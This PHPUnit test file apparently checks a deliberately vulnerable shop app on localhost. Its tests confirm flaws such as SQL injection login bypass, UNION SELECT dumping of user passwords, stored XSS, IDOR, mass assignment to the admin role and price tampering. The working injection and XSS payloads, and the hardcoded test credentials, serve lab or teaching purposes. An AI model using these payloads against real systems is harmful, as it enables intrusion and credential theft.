<?php

declare(strict_types=1);

namespace Tests;

use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\Attributes\TestDox;
use PHPUnit\Framework\Attributes\Group;

#[Group('security')]
class SecurityTest extends TestCase
{
    private const BASE = 'http://localhost:4000';
    private string $userToken = '';
    private string $adminToken = '';

    protected function setUp(): void
    {
        $res = $this->post('/api/auth/login', [
            'email'    => 'carlos@secureshop.com',
            'password' => 'Senha123',
        ]);
        if (isset($res['token'])) {
            $this->userToken = $res['token'];
        }

        $res = $this->post('/api/auth/login', [
            'email'    => 'admin@secureshop.com',
            'password' => 'Admin@2024!',
        ]);
        if (isset($res['token'])) {
            $this->adminToken = $res['token'];
        }
    }

    // =========================================================================
    // V1 — SQL Injection Login
    // =========================================================================

    #[Test]
    #[TestDox('V1a — SQL Injection login: bypass with comment')]
    public function sqlInjectionLoginCommentBypass(): void
    {
        $res = $this->post('/api/auth/login', [
            'email'    => "admin@secureshop.com' --",
            'password' => 'wrong_password',
        ]);

        $this->assertArrayHasKey('token', $res,
            "V1a: SQL comment bypass should return a JWT token.\nResponse: " . json_encode($res));
        $this->assertEquals('admin', $res['user']['role'] ?? '');
    }

    #[Test]
    #[TestDox("V1b — SQL Injection login: OR bypass")]
    public function sqlInjectionLoginOrBypass(): void
    {
        $res = $this->post('/api/auth/login', [
            'email'    => "' OR '1'='1' --",
            'password' => 'anything',
        ]);

        $this->assertArrayHasKey('token', $res,
            "V1b: OR bypass should return a JWT token.\nResponse: " . json_encode($res));
    }

    #[Test]
    #[TestDox('V1c — SQL Injection login: error leaks database info')]
    public function sqlInjectionLoginLeaksInfo(): void
    {
        $res = $this->post('/api/auth/login', [
            'email'    => "' AND (SELECT COUNT(*) FROM",
            'password' => 'x',
        ]);

        $hasSql = isset($res['message']) &&
            (str_contains($res['message'], 'syntax') || str_contains($res['message'], 'SQL') ||
             str_contains($res['message'], 'unrecognized token') || str_contains($res['message'], 'error'));

        $this->assertTrue($hasSql,
            "V1c: Exception response should contain SQL or DB error.\nResponse: " . json_encode($res));
    }

    // =========================================================================
    // V2 — Price Manipulation
    // =========================================================================

    #[Test]
    #[TestDox('V2 — Price manipulation: client-supplied total accepted')]
    public function priceManipulation(): void
    {
        $this->assertNotEmpty($this->userToken, 'Need user token.');

        $res = $this->post('/api/orders', [
            'items' => [['product_id' => 1, 'quantity' => 1, 'price' => 4599.99]],
            'total' => 0.01,
        ], $this->userToken);

        $this->assertArrayHasKey('order', $res,
            "V2: Order should be created.\nResponse: " . json_encode($res));
        $this->assertEquals(0.01, $res['order']['total'] ?? null,
            "V2: Server accepted client-supplied total of 0.01 instead of recalculating.");
    }

    // =========================================================================
    // V3 — IDOR Users
    // =========================================================================

    #[Test]
    #[TestDox('V3a — IDOR: authenticated user can fetch admin record')]
    public function idorFetchAdminProfile(): void
    {
        $this->assertNotEmpty($this->userToken, 'Need user token.');

        $res = $this->get('/api/users/1', [], $this->userToken);

        $this->assertArrayHasKey('id', $res,
            "V3a: Should return user record.\nResponse: " . json_encode($res));
        $this->assertEquals(1, $res['id']);
        $this->assertEquals('admin@secureshop.com', $res['email'] ?? '');
    }

    #[Test]
    #[TestDox('V3b — IDOR: sensitive PII exposed (telefone, cpf_last4, endereco)')]
    public function idorExposesPII(): void
    {
        $this->assertNotEmpty($this->userToken, 'Need user token.');

        $res = $this->get('/api/users/1', [], $this->userToken);

        $this->assertArrayHasKey('telefone', $res,
            "V3b: telefone field exposed via IDOR.");
        $this->assertArrayHasKey('cpf_last4', $res,
            "V3b: cpf_last4 field exposed via IDOR.");
        $this->assertArrayHasKey('endereco', $res,
            "V3b: endereco field exposed via IDOR.");
        $this->assertArrayNotHasKey('password', $res,
            "V3b: password should NOT be returned in IDOR response.");
    }

    // =========================================================================
    // V4 — Mass Assignment
    // =========================================================================

    #[Test]
    #[TestDox('V4 — Mass assignment: register with role=admin')]
    public function massAssignmentRegister(): void
    {
        $unique = 'massassign' . rand(1000, 9999) . '@test.com';
        $res = $this->post('/api/auth/register', [
            'nome'     => 'Hacker',
            'email'    => $unique,
            'password' => 'Test123',
            'role'     => 'admin',
        ]);

        $this->assertArrayHasKey('user', $res,
            "V4: Registration should succeed.\nResponse: " . json_encode($res));
        $this->assertEquals('admin', $res['user']['role'] ?? '',
            "V4: User registered with admin role via mass assignment.");
    }

    // =========================================================================
    // V5 — Stored XSS
    // =========================================================================

    #[Test]
    #[TestDox('V5 — Stored XSS: script tag stored in review')]
    public function storedXssInReview(): void
    {
        $this->assertNotEmpty($this->userToken, 'Need user token.');

        $xssPayload = '<script>alert("XSS")</script>';
        $res = $this->post('/api/products/1/reviews', [
            'text'   => $xssPayload,
            'rating' => 5,
        ], $this->userToken);

        $this->assertArrayHasKey('review', $res,
            "V5: Review should be created.\nResponse: " . json_encode($res));
        $this->assertStringContainsString('<script>', $res['review']['text'] ?? '',
            "V5: Script tag stored without sanitization.");
    }

    // =========================================================================
    // V6 — Error Disclosure + Path Traversal
    // =========================================================================

    #[Test]
    #[TestDox('V6a — Error disclosure: forgot-password leaks stack trace')]
    public function errorDisclosureForgotPassword(): void
    {
        $res = $this->post('/api/auth/forgot-password', [
            'email' => 'test@test.com',
        ]);

        $this->assertArrayHasKey('stack', $res,
            "V6a: forgot-password should return stack trace.\nResponse: " . json_encode($res));
        $this->assertIsArray($res['stack']);
    }

    #[Test]
    #[TestDox('V6b — Path traversal: export reads arbitrary files')]
    public function pathTraversalExport(): void
    {
        $this->assertNotEmpty($this->userToken, 'Need user token.');

        $res = $this->get('/api/export/csv.template', [], $this->userToken);

        $this->assertArrayHasKey('template', $res,
            "V6b: Should return template content.\nResponse: " . json_encode($res));
    }

    // =========================================================================
    // V7 — CORS Wildcard
    // =========================================================================

    #[Test]
    #[TestDox('V7 — CORS wildcard: Access-Control-Allow-Origin is *')]
    public function corsWildcard(): void
    {
        $ch = curl_init(self::BASE . '/');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER         => true,
            CURLOPT_TIMEOUT        => 10,
        ]);
        $fullResponse = curl_exec($ch);
        curl_close($ch);

        $this->assertStringContainsString('Access-Control-Allow-Origin: *', $fullResponse,
            "V7: CORS header should be wildcard *.");
    }

    // =========================================================================
    // V8 — SQL Injection Search
    // =========================================================================

    #[Test]
    #[TestDox('V8a — SQL Injection search: UNION SELECT dumps users')]
    public function sqlInjectionSearchUnion(): void
    {
        $payload = "' UNION SELECT id, email, password, 0, role, created_at FROM users--";
        $res = $this->get('/api/products/search', ['q' => $payload]);

        $this->assertArrayHasKey('results', $res,
            "V8a: Response should have results key.\nGot: " . json_encode($res));

        $flat = json_encode($res['results']);
        $this->assertStringContainsString('admin@secureshop.com', $flat,
            "V8a: UNION SELECT returned users data including admin email.");
    }

    #[Test]
    #[TestDox('V8b — SQL Injection search: plaintext passwords exposed')]
    public function sqlInjectionSearchPasswords(): void
    {
        $payload = "' UNION SELECT id, password, email, 0, role, created_at FROM users--";
        $res = $this->get('/api/products/search', ['q' => $payload]);

        $this->assertArrayHasKey('results', $res);

        $flat = json_encode($res['results']);
        $this->assertStringContainsString('Admin@2024!', $flat,
            "V8b: Plaintext admin password visible in UNION SELECT result.");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    private function get(string $path, array $query = [], ?string $token = null): array
    {
        $url = self::BASE . $path;
        if (!empty($query)) {
            $url .= '?' . http_build_query($query);
        }

        $headers = ['Accept: application/json'];
        if ($token) {
            $headers[] = "Authorization: Bearer $token";
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_TIMEOUT        => 10,
        ]);
        $body = curl_exec($ch);
        curl_close($ch);

        return json_decode($body ?: '{}', true) ?? [];
    }

    private function post(string $path, array $data, ?string $token = null): array
    {
        $headers = [
            'Content-Type: application/json',
            'Accept: application/json',
        ];
        if ($token) {
            $headers[] = "Authorization: Bearer $token";
        }

        $ch = curl_init(self::BASE . $path);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode($data),
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_TIMEOUT        => 10,
        ]);
        $body = curl_exec($ch);
        curl_close($ch);

        return json_decode($body ?: '{}', true) ?? [];
    }
}
